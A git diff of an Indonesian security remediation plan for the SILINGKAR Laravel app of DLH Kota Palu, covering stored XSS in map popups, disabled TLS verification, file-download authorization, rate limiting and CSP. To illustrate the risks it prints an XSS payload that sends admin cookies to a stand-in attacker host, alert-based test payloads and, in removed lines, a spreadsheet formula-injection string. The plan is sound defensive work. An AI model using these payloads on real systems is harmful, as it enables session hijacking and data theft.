@@ -1,214 +1,370 @@
-# Plan Perbaikan Keamanan — DLH Palu (SILINGKAR)
+# Rencana Perbaikan Keamanan — SILINGKAR DLH Kota Palu
 
-Status: draft hasil audit manual terhadap source code (bukan asumsi).
-Semua 7 temuan yang Anda laporkan **sudah diverifikasi langsung ke kode** dan akurat.
-Ditambah 1 detail yang meluas dari temuan #3, dan 2 temuan tambahan baru (#8, #9) hasil audit lanjutan.
-2FA **sengaja tidak dimasukkan** sesuai permintaan.
+Hasil audit ulang dari nol terhadap seluruh source code (routes, semua
+controller admin & publik, middleware, model, file upload service, JS peta,
+config, dependency) pada 18 Agustus 2026. Tidak mengacu ke laporan/plan
+sebelumnya — semua temuan di bawah diverifikasi langsung ke kode saat ini.
 
-Legend prioritas: 🔴 Kritis · 🟠 Tinggi · 🟡 Sedang · 🟢 Rendah
+Legend: 🔴 Kritis · 🟠 Tinggi · 🟡 Sedang · 🟢 Rendah/Informasional
 
----
-
-## 🔴 P0 — Kritis (perbaiki dulu, dampak data sensitif publik)
-
-### 1. Over-exposure `GpsVehicleCache` (imei + raw_data) — 2 titik bocor
-**Lokasi:**
-- `routes/web.php:253` — `GET /api/armada-aktif` → `GpsVehicleCache::all()` mentah, publik, tanpa auth.
-- `app/Http/Controllers/PetaPersampahanController.php` (method `index()`) → `$armada = GpsVehicleCache::all();` lalu di-embed langsung ke HTML via `var initialArmada = @json($armada);` di `resources/views/public/peta-persampahan.blade.php:320`.
-
-**Kenapa bahaya:** `imei` adalah identitas hardware GPS tracker (bisa dipakai untuk spoofing/impersonasi device ke vendor GPS), `raw_data` adalah payload mentah vendor yang berpotensi berisi field yang belum diaudit siapa saja bisa lihat. Frontend (`resources/js/map-bundle.js`) hanya pakai: `imei` (hanya sebagai key marker, bukan ditampilkan), `title`, `veh_type`, `latitude`, `longitude`, `speed`, `angle`, `acc`, `server_time`.
-
-**Fix:**
-```php
-// Buat scope/accessor khusus publik di GpsVehicleCache atau select eksplisit
-GpsVehicleCache::select(['imei','title','veh_type','latitude','longitude','speed','angle','acc','server_time'])->get();
-```
-Lalu untuk marker-matching di JS, ganti `imei` dengan token non-sensitif jika perlu (mis. hash internal), atau biarkan imei tetap dipakai sebagai key internal tapi JANGAN tampilkan raw_data — cukup exclude `raw_data` saja dari select karena imei sendiri masih dipakai JS untuk matching marker. Terapkan `select()` yang sama di KEDUA titik (route closure `armada-aktif` dan `PetaPersampahanController::index()`).
-
-**Effort:** kecil (1-2 jam). **Test:** pastikan peta armada tetap jalan (marker muncul, popup benar) setelah kolom dikurangi.
+Cara pakai: centang `[x]` setiap sub-langkah setelah dikerjakan **dan** diuji.
 
 ---
 
-### 2. IDOR sertifikat sosialisasi (download PDF milik pihak lain)
-**Lokasi:** `routes/web.php:184-190`
+## 🔴 KRITIS — kerjakan lebih dulu
 
-**Fix (pilih salah satu, disarankan opsi A):**
-- **Opsi A — token acak (konsisten dengan pola proyek):** tambah kolom `token` (mis. `Str::random(32)` unik) ke tabel `sosialisasi_peserta`, generate saat record dibuat (pakai pola yang sama seperti `TicketGenerator`), lalu ubah route jadi:
-  ```php
-  Route::get('/sosialisasi/{sosialisasi}/sertifikat/{token}.pdf', function (Sosialisasi $sosialisasi, string $token) {
-      $peserta = SosialisasiPeserta::where('sosialisasi_id', $sosialisasi->id)
-          ->where('token', $token)->firstOrFail();
-      ...
-  })->middleware('throttle:10,1');
-  ```
-- **Opsi B — proteksi login/akses:** jika sertifikat memang hanya perlu diakses peserta terdaftar via link yang dikirim manual (bukan self-service publik), pertimbangkan mengharuskan link diakses lewat halaman `/lacak` dengan nomor tiket yang sudah divalidasi, bukan URL statis yang bisa ditebak.
+### [ ] 1. Stored XSS di popup peta admin via `deskripsi`/`alamat` pengaduan warga
+**Dampak:** Warga (tanpa login) mengisi form pengaduan publik (`/pengaduan-sampah`,
+`/pengaduan-rth`, `/pengaduan-pengendalian`, `/pengaduan-tata-penataan`) — field
+`deskripsi`/`alamat` hanya divalidasi `string|max:...`, tidak ada pembatasan tag
+HTML. Data ini lalu masuk ke widget peta "Sebaran Pengaduan" di **Dashboard
+admin** (dilihat setiap admin/superadmin yang login) tanpa di-escape:
+- `resources/views/admin/partials/sebaran-pengaduan.blade.php` — `r.deskripsi`
+  & `r.alamat` dimasukkan ke `details[].value`.
+- `resources/js/dlh-markers.js` fungsi `popup()` — men-concat `d.value` langsung
+  ke string HTML (`'<span class="dlh-popup-row-text">' + d.value + '</span>'`)
+  lalu di-set via `popup.innerHTML = ...` (trigger: klik marker).
 
-**Migrasi data lama:** peserta existing perlu di-backfill kolom token (`SosialisasiPeserta::whereNull('token')->each(fn($p) => $p->update(['token' => Str::random(32)]))`).
+Payload seperti `<img src=x onerror="fetch('https://attacker.tld/x?c='+document.cookie)">`
+pada `deskripsi` akan tereksekusi di **browser admin/superadmin** saat mereka
+klik marker laporan tsb di Dashboard — bisa dipakai untuk mengambil alih sesi
+admin (kirim request ber-cookie ke endpoint admin lain, mis. buat user
+superadmin baru) karena berjalan dalam konteks sesi admin yang sedang aktif.
 
-**Effort:** sedang (perlu migration + backfill + update semua tempat yang generate link sertifikat, misal email/notifikasi peserta). **Test:** pastikan link lama (tanpa token) sengaja 404, link baru dengan token benar berhasil download, token salah/tebak 404.
-
----
-
-## 🟠 P1 — Tinggi
-
-### 3. Kebocoran audit log lintas-bidang di widget dashboard admin
-**Lokasi:** `app/Http/Controllers/Admin/DashboardController.php:49`
-```php
-'activity' => ActivityLog::with('user')->latest()->take(10)->get(),
-```
-
-**Fix:** terapkan filter yang sama seperti pola `$allowedGroups` yang sudah dipakai di bagian lain file yang sama (baris ~196), dan konsisten dengan `authorizeSuperadmin()` di `ActivityLogController`:
-```php
-'activity' => $isSuperadmin
-    ? ActivityLog::with('user')->latest()->take(10)->get()
-    : ActivityLog::with('user')
-        ->whereHas('user', fn($q) => $q->whereIn(...)) // atau kolom 'bidang'/'module' pada ActivityLog jika ada
-        ->latest()->take(10)->get(),
-```
-Cek dulu struktur tabel `activity_log` — apakah punya kolom `bidang`/`module`/`subject_type` yang bisa langsung difilter ke `$allowedGroups`, itu akan lebih akurat & cepat daripada filter lewat relasi user.
-
-**Effort:** kecil–sedang, tergantung skema `ActivityLog`. **Test:** login sebagai admin bidang RTH, pastikan widget "Aktivitas Terbaru" hanya tampilkan aktivitas bidang RTH (dan aktivitas milik dirinya sendiri jika relevan), superadmin tetap lihat semua.
-
----
-
-### 4. Error message internal bocor saat import GIS gagal
-**Lokasi:** `app/Http/Controllers/Admin/PetaController.php:367-372`
-
-**Fix:**
-```php
-} catch (\Exception $e) {
-    \Log::error("IMPORT FAILED: " . $e->getMessage() . " at " . $e->getFile() . ":" . $e->getLine());
-
-    return response()->json([
-        'success' => false,
-        'message' => app()->hasDebugModeEnabled()
-            ? 'Gagal import: ' . $e->getMessage() . ' [' . basename($e->getFile()) . ':' . $e->getLine() . ']'
-            : 'Gagal import data GIS. Periksa kembali format file, atau hubungi administrator jika masalah berlanjut.',
-    ], 422);
-}
-```
-Gunakan `config('app.debug')` untuk menentukan apakah detail teknis ditampilkan (aman untuk dev/staging, tersembunyi di production). Terapkan pola sama untuk 3 tempat lain yang catch Exception di file yang sama (baris 401, 543, 868-890) — cek satu-satu apakah messagenya juga bocor ke response (bukan cuma log).
-
-**Effort:** kecil.
+**Langkah perbaikan:**
+- [ ] Buat helper escape HTML (mis. `escapeHtml(str)` di `dlh-markers.js`,
+      setara `htmlspecialchars`) dan pakai di **setiap** titik yang meng-concat
+      nilai dinamis ke string HTML popup, minimal:
+      - `dlh-markers.js` fungsi `popup()`: `cfg.nama`, `cfg.kategori`,
+        `cfg.status.text`, tiap `details[].value`.
+      - `map-bundle.js` (armada GPS): variabel `v.title` sebelum di-concat ke `ph`.
+      - `map-bundle.js` fungsi `makePopupHtml`/props-loop GIS layer (lihat item
+        #2 di bawah — 1 perbaikan bisa sekaligus menutup kedua celah karena
+        fungsinya sama, `DlhMarkers.popup()`).
+- [ ] Alternatif/tambahan yang lebih aman by-default: ganti pendekatan concat
+      string jadi membangun node DOM (`textContent`, bukan `innerHTML`) untuk
+      bagian yang berisi data dinamis, dan hanya pakai `innerHTML` untuk markup
+      statis (ikon SVG, struktur wrapper).
+- [ ] Setelah fix, uji: submit pengaduan (sampah/RTH/pengendalian/tata
+      penataan) dengan `deskripsi` = `<img src=x onerror=alert(document.domain)>`,
+      lalu buka Dashboard admin sebagai admin bidang terkait, klik marker
+      laporan tsb — pastikan payload tampil sebagai **teks**, bukan tereksekusi.
+- [ ] Uji regresi: pastikan popup peta (armada, GIS layer, sebaran pengaduan,
+      objek pengawasan) masih tampil dengan benar (karakter `<`, `>`, `&` pada
+      data normal tidak merusak layout).
 
 ---
 
-### 5. CSP masih `unsafe-inline`/`unsafe-eval`
-**Lokasi:** `app/Http/Middleware/SecurityHeaders.php:43`
+### [ ] 2. Stored XSS di popup peta publik — data GPS vendor & GIS import tidak di-escape
+**Dampak:** Popup marker armada (halaman publik `/armada`, `/peta-persampahan`)
+dan popup layer GIS (`/peta-persampahan`, `/peta-objek-pengawasan`, peta admin)
+dibangun dari concat string mentah, dieksekusi untuk **setiap pengunjung publik
+tanpa perlu login maupun klik** (memakai `maplibregl.Popup().setHTML()` native
+yang langsung menyisipkan HTML ke DOM saat marker digambar, bukan hanya saat
+di-klik):
+- `resources/js/map-bundle.js` fungsi `dlhPetaPersampahanDrawArmada()` — variabel
+  `v.title` (nama kendaraan, berasal dari data mentah API vendor GPS
+  `portal.gps.id` via `GpsService::updateCache()`, lihat `app/Services/GpsService.php`)
+  di-concat langsung ke variabel `ph` lalu `.setHTML(ph)`.
+- `resources/js/map-bundle.js` — loop `Object.keys(props).forEach(...)` yang
+  membangun detail popup dari **seluruh properti mentah file GeoJSON/SHP** yang
+  diimpor admin lewat menu Peta (GIS), tanpa whitelist maupun escaping.
+- `resources/views/components/public/peta-objek-pengawasan.blade.php` →
+  `nama_perusahaan`, `alamat` (diisi admin bidang Tata Penataan lewat menu
+  admin, bukan `{!! !!}` blade — tapi tetap dikirim mentah ke
+  `DlhMarkers.popup()` di JS via `@js(...)`).
 
-**Fix (bertahap, karena refactor besar):**
-1. Audit semua inline `<script>...</script>` dan `onclick="..."` di blade — pindahkan ke file `.js` eksternal atau pakai nonce.
-2. Implementasi CSP nonce per-request:
-   ```php
-   $nonce = base64_encode(random_bytes(16));
-   view()->share('cspNonce', $nonce);
-   // script-src 'self' 'nonce-{$nonce}';
-   ```
-3. Untuk `unsafe-eval` — cari library/kode yang pakai `eval()`/`new Function()` (biasanya dari `map-bundle.js` bundling atau vendor tertentu), ganti ke pendekatan tanpa eval.
-4. Rollout bertahap: mulai dengan `Content-Security-Policy-Report-Only` untuk lihat pelanggaran nyata sebelum enforce.
+**Kenapa ini serius meski "hanya admin yang input":** vendor GPS (`portal.gps.id`)
+adalah pihak ketiga di luar kendali penuh tim — siapa pun yang berhak
+mengganti nama unit di portal vendor tsb (bisa banyak pihak: operator lapangan,
+kontraktor, atau — dikombinasikan dengan temuan #3 di bawah — penyerang MITM)
+otomatis bisa menyuntik XSS ke **seluruh pengunjung publik** tanpa melalui
+akun admin sama sekali. Untuk data GIS import & objek pengawasan, XSS tetap
+tersimpan permanen dan menyerang pengunjung publik meski sumber datanya admin.
 
-**Effort:** besar (ini refactor lintas file). **Prioritas realistis:** jadikan item roadmap terpisah, bukan quick-fix — tapi tetap harus dikerjakan karena unsafe-inline+unsafe-eval melumpuhkan sebagian besar manfaat CSP terhadap XSS.
-
----
-
-## 🟡 P2 — Sedang
-
-### 6. CSV/XLSX Formula Injection
-**Lokasi:** `app/Support/DataIO.php` — `displayValue()`, `xlsxCell()`, method-method write CSV/XLSX.
-
-**Fix:** tambah sanitasi di titik tunggal sebelum tulis ke cell:
-```php
-protected static function sanitizeCell(string $value): string
-{
-    if ($value !== '' && in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
-        return "'" . $value; // prefix apostrophe -> Excel treat sebagai teks, bukan formula
-    }
-    return $value;
-}
-```
-Panggil `sanitizeCell()` di:
-- `csvDownload()` & `writeCsvFile()` — sebelum `fputcsv()`
-- `writeXlsx()` & `writeXlsxRows()` — di dalam `xlsxCell()` (titik paling sentral, otomatis cover semua caller)
-- `csvRowsDownload()` — sebelum `fputcsv()`
-
-**Effort:** kecil (1 fungsi + beberapa call site). **Test:** buat pengaduan dengan nama pelapor `=cmd|'/c calc'!A1`, export CSV & XLSX, buka di Excel — pastikan muncul sebagai teks literal (dengan prefix `'`), bukan tereksekusi.
-
----
-
-### 7. robots.txt tidak exclude `/admin`
-**Lokasi:** `public/robots.txt`
-
-**Fix:**
-```
-User-agent: *
-Disallow: /admin
-Disallow: /api/
-```
-Catatan: ini bukan kontrol akses (halaman admin tetap harus dilindungi middleware auth sebagai lapisan utama), ini murni mengurangi permukaan reconnaissance/indexing.
-
-**Effort:** trivial.
+**Langkah perbaikan:**
+- [ ] Sama seperti item #1 — terapkan escaping di `DlhMarkers.popup()` (satu
+      perbaikan otomatis menutup celah di sini juga karena fungsi ini dipakai
+      bersama).
+- [ ] Escape khusus di `map-bundle.js` untuk `v.title` sebelum masuk ke
+      template `ph` (armada).
+- [ ] Escape setiap `props[key]` sebelum push ke `details` di loop
+      `Object.keys(props).forEach(...)` (GIS import) — pertimbangkan juga
+      membatasi panjang tiap value (mis. 200 karakter) agar popup tidak bisa
+      dipakai untuk DoS visual/payload besar.
+- [ ] Uji: set nama unit GPS vendor (atau `raw_data`/`title` di
+      `gps_vehicle_cache` langsung via tinker untuk simulasi) berisi payload
+      HTML, buka `/armada` sebagai pengunjung anonim — pastikan tidak
+      tereksekusi.
+- [ ] Uji: import file `.geojson` dengan salah satu properti berisi
+      `<script>` atau `<img onerror=...>`, buka `/peta-persampahan` publik —
+      pastikan tampil sebagai teks.
 
 ---
 
-## 🟢 P3 — Rendah
+### [ ] 3. Verifikasi sertifikat TLS dimatikan saat menghubungi API vendor GPS
+**Lokasi:** `app/Services/GpsService.php` — method `getToken()` (baris ±44) dan
+`fetchWithToken()` (baris ±99), keduanya memakai `Http::withoutVerifying()`
+saat mengirim **username & password** login vendor GPS dan saat mengambil data
+monitoring dengan bearer token.
 
-### 8. Livewire `ChatBot::saveAssistantMessage()` bisa dipalsukan dari client
-**Lokasi:** `app/Livewire/ChatBot.php`
+**Dampak:** Koneksi ke `portal.gps.id` tidak memverifikasi sertifikat TLS
+server tujuan — membuka celah *man-in-the-middle*: siapa pun yang berada di
+jalur jaringan (DNS spoofing, rogue proxy, jaringan tidak tepercaya di sisi
+hosting) bisa menyadap **kredensial vendor GPS** yang dikirim di setiap
+pemanggilan `getToken()`, atau memalsukan data armada yang diterima (termasuk
+menyuntik payload XSS — lihat temuan #2 — tanpa perlu mengakses akun vendor
+sungguhan).
 
-**Fix:** jangan percaya `$content` dari client untuk role assistant. Opsi paling simpel: hapus method publicly-callable ini sepenuhnya dan simpan pesan assistant di server saat `ChatStreamController::stream()` sukses merespons (server-side, bukan lewat panggilan Livewire terpisah dari JS). Jika arsitektur streaming butuh method ini tetap ada:
-```php
-public function saveAssistantMessage(string $content, string $requestToken): void
-{
-    // $requestToken = nonce yang di-generate server saat addUserMessage() dipanggil,
-    // dikembalikan ke JS, lalu wajib disertakan balik saat save.
-    if (! hash_equals((string) session('chatbot_pending_token'), $requestToken)) {
-        return;
-    }
-    session()->forget('chatbot_pending_token');
-    ...
-}
-```
-**Effort:** kecil–sedang tergantung alur streaming saat ini. **Catatan:** dampak rendah (self-XSS-like, terbatas ke sesi sendiri), jadi boleh dikerjakan belakangan dibanding item P0/P1.
-
----
-
-## Temuan Tambahan (hasil audit lanjutan, belum ada di laporan awal Anda)
-
-### 9. 🟢 `TRUSTED_PROXIES` fallback ke `*` bila env kosong
-**Lokasi:** `bootstrap/app.php:19`
-```php
-$trustedProxies = env('TRUSTED_PROXIES', '172.16.0.0/12,127.0.0.1');
-```
-Default-nya sudah aman (private range + localhost, bukan `*`), TAPI kalau suatu saat ada yang salah set `TRUSTED_PROXIES=*` di `.env` (misal saat debugging cepat), maka `X-Forwarded-For` dari siapa pun akan dipercaya mentah-mentah — ini bisa dipakai bypass rate limiting (`throttle:*` di Laravel key by IP) dengan spoof header, dan bisa mempengaruhi logging IP (termasuk `ActivityLogger` kalau mencatat IP pelapor).
-
-**Fix:** tidak ada perubahan kode wajib sekarang (default sudah aman), tapi:
-- Tambahkan comment/dokumentasi tegas di `.env.example` bahwa `TRUSTED_PROXIES=*` HANYA untuk situasi reverse-proxy yang sudah pasti terisolasi, jangan dipakai sembarangan di production.
-- Opsional: tambahkan validasi startup yang warning/log kalau `APP_ENV=production` tapi `TRUSTED_PROXIES=*`.
-
-**Effort:** trivial (dokumentasi) → kecil (kalau mau tambah validasi).
-
-### 10. 🟢 Verifikasi cakupan sanitasi HTML konten dinamis lain
-Saya sudah cek `resources/views/public/berita/show.blade.php` dan `admin/artikel/show.blade.php` — keduanya sudah benar pakai `HtmlSanitizer::clean()` sebelum `{!! !!}`. Blade lain yang pakai `{!! !!}` (`welcome.blade.php`, `profil.blade.php`, komponen admin) berisi string hardcoded, bukan input user, jadi aman. **Tidak ada aksi diperlukan** — dicatat di sini sebagai bukti area ini sudah dicek, bukan diasumsikan aman.
+**Langkah perbaikan:**
+- [ ] Hapus `->withoutVerifying()` pada kedua pemanggilan di
+      `app/Services/GpsService.php`.
+- [ ] Jika alasan awal pemasangan `withoutVerifying()` adalah error sertifikat
+      (mis. sertifikat self-signed/expired di sisi vendor, atau masalah CA
+      bundle di server produksi), perbaiki akar masalahnya: pastikan CA bundle
+      sistem (`cacert.pem`) ter-update di image Docker, **atau** hubungi vendor
+      GPS untuk memperbaiki sertifikat mereka — jangan mematikan verifikasi
+      sebagai solusi permanen.
+- [ ] Uji: jalankan job/scheduler yang memanggil `GpsService::fetchAndCache()`
+      di lingkungan staging/produksi setelah perubahan, pastikan login &
+      fetch data armada tetap berhasil (cek `storage/logs/laravel.log` untuk
+      error `cURL error 60` — jika muncul, baru itu saatnya memperbaiki CA
+      bundle, bukan mengembalikan `withoutVerifying()`).
 
 ---
 
-## Area yang Sudah Dicek dan Terlihat Aman (FYI, tidak perlu dikerjakan)
-- File upload (`FileUploadService`): SVG ditolak, EXIF/GPS di-strip, mime divalidasi via `Request` rules (bukan cuma ekstensi client).
-- Backup/restore (`BackupController`): two-step confirmation (kata `RESTORE` + kode acak per-sesi sekali pakai via `hash_equals`), akses dibatasi `authorizeSuperadmin()`.
-- Proxy gambar OG (`OgImageProxyController`): validasi path traversal lengkap (`..`, absolute path, null byte, backslash, drive letter).
-- Query builder resource admin (`ResourceController::query()`): kolom sort & search di-whitelist dari `$meta['columns']`/`getFillable()`, tidak menerima nama kolom mentah dari request → aman dari SQL injection.
-- Mass assignment (`ResourceController::payload()`): dibangun field-by-field dari `AdminRegistry::formFields()`, bukan `$request->all()` → aman dari privilege escalation via field tak terduga.
-- Rate limiting: login `5/menit`, chatbot `20/menit`, endpoint publik lain rata-rata `10-120/menit` — reasonable.
-- Cookie/session: `SESSION_SECURE_COOKIE=true`, `http_only=true`, `same_site=lax`, `APP_DEBUG=false` by default.
-- `TicketGenerator`: format `PREFIX-XXXX-XXXX` (8 karakter alfanumerik acak, uniqueness dicek ke DB) — cukup kuat melawan brute force dikombinasi dengan throttle.
+## 🟠 TINGGI
+
+### [ ] 4. `ResourceController::downloadFile()` tidak memeriksa kepemilikan/izin per-bidang
+**Lokasi:** `app/Http/Controllers/Admin/ResourceController.php` method
+`downloadFile()` (±baris 273), route `GET /admin/file/download`.
+
+**Dampak:** Endpoint ini hanya mensyaratkan middleware `auth` + `admin.access`
+(yaitu: **login sebagai admin apa pun**, bidang apa pun). Tidak ada
+pemeriksaan apakah admin yang meminta punya akses ke *resource*/bidang pemilik
+file tsb — berbeda dengan `index/show/store/...` yang selalu memanggil
+`$this->authorize($meta)`. Admin bidang RTH yang tahu/menebak path storage
+(mis. dari pola penamaan folder `admin/{slug}/...` yang bisa ditebak dari
+kode ini sendiri) berpotensi mengunduh lampiran pengaduan/dokumen milik bidang
+lain (Pengendalian, Sampah & LB3, dst.) yang mungkin berisi data pribadi
+pelapor.
+
+**Langkah perbaikan (pilih salah satu, disarankan opsi A):**
+- [ ] **Opsi A:** tambahkan parameter `resource` (slug) wajib di query string,
+      panggil `AdminRegistry::find($resource)` lalu `$this->authorize($meta)`
+      sebelum melayani file — pastikan path yang diminta memang berada di
+      bawah direktori resource tsb (`admin/{slug}/...`) sebagai lapis tambahan.
+- [ ] **Opsi B (lebih sederhana, lebih longgar):** jika memang By Design semua
+      admin panel (apa pun bidangnya) boleh saling lihat lampiran lintas
+      bidang, dokumentasikan keputusan ini secara eksplisit di kode + beri
+      tahu pemilik sistem/DPO — karena ini menyangkut kebijakan privasi data
+      pelapor, bukan murni keputusan teknis.
+- [ ] Uji: login sebagai admin bidang RTH, coba akses
+      `/admin/file/download?path=admin/pengaduan-pengendalian/<file-bidang-lain>.jpg` —
+      pastikan ditolak (403) bila Opsi A diterapkan.
 
 ---
 
-## Ringkasan Urutan Pengerjaan yang Disarankan
-1. **P0:** #1 (exposure GPS), #2 (IDOR sertifikat)
-2. **P1:** #3 (dashboard activity log), #4 (error leak GIS import), #6 (formula injection — gampang & cepat, naikkan ke awal kalau mau quick win)
-3. **P1 (besar, jadwalkan terpisah):** #5 (CSP hardening)
-4. **P2/P3:** #7 (robots.txt), #8 (ChatBot spoofing)
-5. **Dokumentasi:** #9 (TRUSTED_PROXIES)
+### [ ] 5. Rate limiting tidak konsisten di form publik (Livewire) — 3 dari 7 form tanpa limit
+**Lokasi:** `config/livewire.php` (`'middleware' => null` — endpoint update
+Livewire utama tidak dibatasi rate secara global, hanya endpoint upload file
+yang punya default `throttle:60,1`). Proteksi manual per-komponen memang sudah
+ada di beberapa form via `RateLimiter::tooManyAttempts()`, TAPI tidak lengkap:
 
-Setelah masing-masing fix, jalankan regression test manual pada fitur terkait (peta armada, export data, dashboard admin per role, download sertifikat, import GIS, chatbot) sebelum deploy ke production.
+| Komponen | Rate limit manual? |
+|---|---|
+| `pengaduan-sampah.blade.php` | ✅ ada (5/jam per IP) |
+| `pengaduan-pengendalian.blade.php` | ✅ ada (5/jam per IP) |
+| `pengaduan-tata-penataan.blade.php` | ✅ ada (5/jam per IP) |
+| `permohonan-rekomendasi.blade.php` | ✅ ada (3/jam per IP) |
+| `pengajuan-rintek-pertek.blade.php` | ✅ ada |
+| **`pengaduan-rth.blade.php`** | ❌ **tidak ada** |
+| **`registrasi-usaha-lb3.blade.php`** | ❌ **tidak ada** |
+| **`pinjam-taman.blade.php`** | ❌ **tidak ada** |
+
+**Dampak:** 3 form ini bisa disubmit berulang tanpa batas (spam data,
+membanjiri notifikasi admin, membebani storage lewat upload foto/dokumen
+berulang, serta memperbesar permukaan untuk temuan #1 di atas — makin banyak
+percobaan, makin besar peluang payload XSS "menempel").
+
+**Langkah perbaikan:**
+- [ ] Terapkan pola `RateLimiter::tooManyAttempts()` /
+      `RateLimiter::hit()` yang sama persis seperti di
+      `pengaduan-sampah.blade.php` ke:
+      - `resources/views/components/public/pengaduan-rth.blade.php`
+      - `resources/views/components/public/registrasi-usaha-lb3.blade.php`
+      - `resources/views/components/public/pinjam-taman.blade.php`
+- [ ] Pertimbangkan solusi lebih menyeluruh: pasang
+      `throttle:60,1` (atau nilai lain sesuai kebutuhan) di
+      `config/livewire.php` pada level middleware endpoint update Livewire
+      global, sebagai jaring pengaman tambahan di luar limit manual per-form.
+- [ ] Uji: submit form RTH/registrasi LB3/pinjam-taman berulang kali (>5x)
+      dalam waktu singkat dari IP yang sama — pastikan muncul pesan "terlalu
+      banyak percobaan" setelah melewati batas.
+
+---
+
+### [ ] 6. CSP masih mengizinkan `'unsafe-inline'` dan `'unsafe-eval'` pada policy yang di-enforce
+**Lokasi:** `app/Http/Middleware/SecurityHeaders.php` — header
+`Content-Security-Policy` (yang aktif memblokir) masih berisi
+`script-src 'self' 'unsafe-inline' 'unsafe-eval'`. Sudah ada mekanisme
+migrasi paralel yang baik (nonce + `Content-Security-Policy-Report-Only`
+tanpa `unsafe-inline`), tapi migrasinya belum selesai — kebijakan yang benar-benar
+memblokir (bukan report-only) masih permisif.
+
+**Dampak:** Selama `unsafe-inline`/`unsafe-eval` masih aktif di policy yang
+di-*enforce*, CSP praktis tidak memberi proteksi tambahan terhadap XSS
+(termasuk dua XSS di atas) — payload `<script>`/`onerror=`/`onload=` inline
+tetap diizinkan berjalan oleh browser walau CSP terpasang.
+
+**Langkah perbaikan:**
+- [ ] Pantau pelanggaran yang muncul di `Content-Security-Policy-Report-Only`
+      (buka console browser di semua halaman utama: publik & admin) untuk
+      inventarisasi semua inline script/handler yang masih perlu dimigrasi ke
+      nonce atau file eksternal.
+- [ ] Migrasi bertahap per halaman: pindahkan `<script>...</script>` inline ke
+      `@push('scripts')` dengan atribut nonce (`{{ $cspNonce }}` — mekanisme
+      sudah ada via `Vite::cspNonce()`), atau ke file `.js` terpisah.
+- [ ] Cari & hilangkan pemakaian `eval()`/`new Function()` (biasanya dari
+      bundling/minifier tertentu) yang memicu kebutuhan `unsafe-eval`.
+- [ ] Setelah Report-Only bersih dari pelanggaran (0 laporan selama beberapa
+      hari pemakaian normal), promosikan policy nonce-based tsb menjadi
+      policy yang di-*enforce*, hapus `unsafe-inline`/`unsafe-eval` dari
+      header `Content-Security-Policy` utama.
+- [ ] **Catatan:** ini pekerjaan lintas-file yang besar — jadwalkan sebagai
+      item terpisah, bukan quick-fix, tapi tetap prioritas tinggi karena CSP
+      adalah lapis pertahanan kedua untuk XSS di atas.
+
+---
+
+## 🟡 SEDANG
+
+### [ ] 7. Audit dependency belum otomatis (Composer & npm)
+**Konteks:** Versi package saat ini (`laravel/framework v12.63.0`,
+`livewire/livewire v4.3.3`, `barryvdh/laravel-dompdf v3.1.2` /
+`dompdf/dompdf v3.1.5`, `ezyang/htmlpurifier v4.19.0`, `guzzlehttp/guzzle
+7.13.2`) tergolong versi yang cukup baru per Januari 2026; tidak ditemukan
+indikasi versi usang secara jelas dari pemeriksaan manual. Namun tidak ada
+proses otomatis yang memverifikasi ini secara berkala, dan pemeriksaan manual
+tidak menggantikan database advisory resmi (Composer/GitHub tidak bisa
+diakses dari lingkungan audit ini untuk cross-check CVE terbaru).
+
+**Langkah perbaikan:**
+- [ ] Jalankan `composer audit` dan `npm audit` secara manual sekarang
+      (di lingkungan dengan akses internet penuh) sebagai baseline, catat &
+      tindak lanjuti temuan bila ada.
+- [ ] Aktifkan Dependabot (GitHub) atau Renovate untuk composer.json &
+      package.json agar update keamanan terdeteksi otomatis.
+- [ ] Tambahkan `composer audit` ke pipeline CI/CD (jika ada) agar build gagal
+      jika ditemukan vulnerability tingkat high/critical yang belum di-patch.
+
+### [ ] 8. `app/Support/DataIO.php` — pastikan sanitasi formula CSV/XLSX tetap konsisten ke depan
+**Konteks:** Saat audit ini, `sanitizeCell()` sudah diterapkan di titik-titik
+penulisan CSV/XLSX (`csvDownload`, `writeCsvFile`, `xlsxCell`,
+`csvRowsDownload`) — **tidak ada tindakan perbaikan diperlukan sekarang**.
+Dicatat di sini sebagai item proses, bukan bug:
+
+- [ ] Tambahkan test otomatis (unit test) yang menegaskan
+      `DataIO::sanitizeCell()` selalu dipanggil untuk setiap fungsi export
+      baru yang mungkin ditambahkan di masa depan (mis. assert bahwa string
+      berawalan `=`, `+`, `-`, `@` selalu diberi prefix apostrophe pada
+      hasil akhir), agar regresi (fungsi export baru lupa memanggilnya)
+      langsung ketahuan di CI.
+
+### [ ] 9. `robots.txt` & `security.txt` — sudah baik, jadikan baseline
+**Konteks:** `public/robots.txt` sudah men-disallow `/admin` dan `/api/`;
+`.well-known/security.txt` sudah ada dengan kontak yang benar. Tidak ada
+tindakan wajib. Opsional:
+- [ ] Tambahkan juga `Disallow: /admin` versi tanpa trailing difference untuk
+      subpath (`/admin/*` sudah otomatis ter-cover oleh `/admin`, jadi cukup
+      sebagai pengingat — tidak ada perubahan kode diperlukan).
+
+---
+
+## 🟢 RENDAH / INFORMASIONAL
+
+### [ ] 10. `TRUSTED_PROXIES` — default aman, tambahkan pengaman dokumentasi
+**Lokasi:** `bootstrap/app.php`, default `172.16.0.0/12,127.0.0.1` (aman).
+Risiko hanya muncul jika seseorang mengubah `.env` produksi menjadi
+`TRUSTED_PROXIES=*` secara tidak sengaja (mis. saat debugging), yang akan
+membuat header `X-Forwarded-For` dari siapa pun dipercaya mentah — berdampak
+ke rate limiting (`throttle:*` by IP, termasuk semua limiter yang disebut di
+temuan #5) dan pencatatan IP di `ActivityLog`.
+- [ ] Tambahkan komentar tegas di `.env.example` (jika belum ada baris yang
+      cukup eksplisit) bahwa `TRUSTED_PROXIES=*` tidak boleh dipakai di
+      produksi kecuali reverse-proxy benar-benar terisolasi penuh.
+- [ ] Opsional: tambahkan pemeriksaan startup yang mencatat warning ke log
+      bila `APP_ENV=production` tapi `TRUSTED_PROXIES=*`.
+
+### [ ] 11. Dockerfile/nginx — catatan pengerasan kecil, tidak mendesak
+- [ ] `nginx.conf` tidak mengatur `client_max_body_size` secara eksplisit
+      (default nginx 1MB) — jika ini yang membatasi upload backup restore
+      (maks 500MB di `BackupController`) atau upload dokumen besar, pastikan
+      nilai ini disamakan/dilonggarkan secukupnya di konfigurasi nginx
+      produksi (di luar file `nginx.conf` contoh ini bila produksi memakai
+      konfigurasi lain).
+- [ ] Tidak ditemukan proses berjalan sebagai root secara tidak perlu di
+      `Dockerfile` (php-fpm master process by design perlu start sebagai root
+      lalu drop privilege ke `www-data` di level pool config bawaan image
+      resmi) — tidak ada tindakan wajib.
+
+---
+
